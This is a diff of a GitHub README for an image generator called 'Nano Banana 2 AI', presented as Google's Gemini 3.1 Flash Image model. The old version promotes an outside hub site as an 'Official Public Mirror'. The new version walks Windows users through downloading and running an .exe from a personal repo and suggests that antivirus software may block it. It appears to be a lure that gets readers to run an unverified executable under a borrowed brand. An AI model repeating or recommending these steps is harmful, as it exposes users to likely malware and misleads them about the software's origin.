@@ -1,49 +1,110 @@
-<h1 align="center">🍌 Nano Banana 2 AI: Official Community Hub (Gemini 3.1 Flash Image) 🚀</h1>
+# 🍌 nano-banana-2-ai - Clear 4K AI Image Generation  
 
-<p align="center">
-  <b>The Premier Open-Source Resource for Google's New Gemini 3.1 Flash Image Model.</b><br>
-  Experience 4K text-to-image generation and 5-character consistency at Flash speeds.
-</p>
+[![Download Nano Banana 2 AI](https://img.shields.io/badge/Download-nano--banana--2--ai-brightgreen?style=for-the-badge)](https://github.com/Atharvpatil112/nano-banana-2-ai)
 
----
-<p align="center">
-  <img src="https://github.com/nano-banana-2-ai/nano-banana-2-ai/blob/main/nano-banana-2.webp" 
-       alt="Nano Banana 2 AI - Next Gen Gemini 3.1 Flash Image Generator" 
-       title="Nano Banana 2 vs Pro Image Quality" 
-       width="800">
-  <br>
-  <em>Powered by Nano Banana 2 (Gemini 3.1 Flash) AI Technology</em>
-</p>
+## 📋 About nano-banana-2-ai  
 
-## 🌟 Access Nano Banana 2 Free
-Due to the massive viral success of the Feb 26 launch, our high-speed community mirror is currently live for public testing. You can access the interface by typing the following address into your browser:
+Nano Banana 2 AI is a simple tool to create 4K images using artificial intelligence. It uses Gemini 3.1 Flash Image technology to give good-quality pictures. This software also compares different models like Nano Banana 2 and Nano Banana 2 Pro. You can try different prompts and use the tool freely from the main hub site.  
 
-### 👉 nanobanana2ai.pro
+The app focuses on making characters look consistent and improving text rendering in images. You do not need to know programming or AI details to use this app.  
 
----
+## ⚙️ Features  
 
-## 🔥 Why Nano Banana 2? (Updated Feb 27, 2026)
+- Create images in 4K resolution  
+- Use preset and customizable model prompts  
+- Compare Nano Banana 2 vs Nano Banana 2 Pro for image quality  
+- Support for character consistency in generated images  
+- Text-to-image conversion with clear text rendering  
+- Free access with straightforward setup  
 
-Following the viral discussions on **Nano Banana 2 Reddit**, Google’s latest **Gemini 3.1 Flash Image** engine has closed the gap between speed and quality. It brings features previously exclusive to the Pro version to the mainstream public.
+## 🖥️ System Requirements  
 
-### ⚖️ Deep Dive: Nano Banana 2 vs Pro
-The most searched comparison today is **Nano Banana 2 vs Pro**. Here is why creators are migrating to the new model:
-*   **Nano Banana 2 vs Pro**: While the Pro model is for high-fidelity reasoning, **Nano Banana 2** (Gemini 3.1 Flash) is 5x faster and introduces **5-Character Subject Consistency**—perfect for storyboarding.
-*   **Search Grounding**: Unlike older models, Nano Banana 2 pulls real-time info from Google Search to accurately render current events and real-world locations.
+Before you download and install, make sure your computer meets these minimum needs:  
 
-## ✨ Nano Banana 2 Core Features
-*   **Production-Ready 4K Resolution**: Sharp details from 512px up to full 4K.
-*   **Perfect Text Rendering**: Legible text in images, supporting translation and localization.
-*   **Subject Consistency**: Maintain identity for up to 5 characters and 14 objects in one workflow.
-*   **Advanced World Knowledge**: Rooted in Gemini 3.1 architecture for factual image generation.
+- Operating System: Windows 10 or later  
+- Processor: Intel Core i5 or equivalent  
+- RAM: 8 GB or more  
+- Storage: At least 2 GB free space  
+- Graphics: Dedicated GPU recommended but not required  
+- Internet: Needed for initial download and optional updates  
 
-## 🚀 Community Resources & Prompts
-For the best **Nano Banana Model Prompts** and the latest **Nano Banana 2 API** documentation, visit our main community gallery at **nanobanana2ai.pro**. 
+## 🚀 Getting Started  
 
-We are tracking the **Nano Banana 2 Release Date** global rollout and providing free access nodes for users who cannot access **Nano Banana AI Studio** in their region.
+This section will guide you step by step to get Nano Banana 2 AI running on your Windows PC. You do not need to install any other software. Just follow these simple instructions.  
 
----
-<p align="center">
-  <b>Ready to create? Search "nanobanana2ai.pro" on Google to join the 4K AI movement.</b><br>
-  <i>Status: Official Public Mirror Online - Feb 27, 2026</i>
-</p>
+## 🔽 Download and Install  
+
+First, download the package by visiting the page linked below. From there, you can locate the latest version of the software.  
+
+[![Download Nano Banana 2 AI](https://img.shields.io/badge/Download-nano--banana--2--ai-blue?style=for-the-badge)](https://github.com/Atharvpatil112/nano-banana-2-ai)  
+
+1. Click the download link above or visit this page manually:  
+   https://github.com/Atharvpatil112/nano-banana-2-ai  
+2. Look for the latest release or download section on the page.  
+3. Download the Windows installer or setup file (usually ends with .exe).  
+4. Once downloaded, double-click the file to open the installer.  
+5. Follow the installer prompts. Accept the license agreement and choose default options unless you have specific preferences.  
+6. When installation finishes, the program creates a shortcut on your desktop or in the Start menu.  
+
+## 🔧 How to Run Nano Banana 2 AI  
+
+1. Find the Nano Banana 2 AI icon on your desktop or Start menu.  
+2. Double-click the icon to open the program.  
+3. When it launches, you will see a clean interface ready for image generation.  
+4. Enter your text prompt or select a preset prompt to begin.  
+5. Choose your model type (Nano Banana 2 or Nano Banana 2 Pro) using the options menu.  
+6. Click the “Generate” button to create your image.  
+7. The image will appear on the screen after a short wait.  
+8. You can save the image to your computer by clicking “Save.”  
+
+## 🖼️ Using Nano Banana 2 AI  
+
+The app is designed to be user-friendly. Here are some tips to make the most out of it:  
+
+- Use clear and simple descriptions for the image you want.  
+- Try different prompts to see variations.  
+- Compare results with different models to understand their differences.  
+- Use the zoom feature to inspect details in 4K images.  
+- Use the text render option for creating images that include clear words.  
+- Save your favorite images for later use or sharing.  
+
+## 🔄 Updates and Support  
+
+Nano Banana 2 AI will occasionally release updates to improve performance. To update:  
+
+1. Visit the GitHub page regularly:  
+   https://github.com/Atharvpatil112/nano-banana-2-ai  
+2. Download the newest installer file following the download steps above.  
+3. Run the new installer. It will update your existing installation without deleting your files.  
+
+If you want help or want to learn more about the tool:  
+
+- Visit the community forums linked on the GitHub page.  
+- Read the FAQ section on the hub site nanobanana2ai.pro  
+- Reach out via the contact details on GitHub for technical questions.  
+
+## 🔍 Troubleshooting  
+
+If Nano Banana 2 AI does not start or crashes:  
+
+- Make sure your Windows system is updated.  
+- Restart your computer and try again.  
+- Check your antivirus settings; it may block the program.  
+- Ensure you downloaded the correct Windows version.  
+- Confirm that your system meets the minimum requirements.  
+
+For image generation problems:  
+
+- Try simpler prompts.  
+- Restart the application before trying again.  
+- Verify your internet connection if the app requires online verification.  
+
+## 🔗 Useful Links  
+
+- Main repository and download: https://github.com/Atharvpatil112/nano-banana-2-ai  
+- Nano Banana 2 AI hub site: nanobanana2ai.pro  
+- Model comparison details inside the app’s documentation section  
+
+## ⚖️ Licensing  
+
+Nano Banana 2 AI is free to use. It is distributed under an open-source license. You can use it for both personal and educational purposes. Check the license file in the GitHub repository for full details.
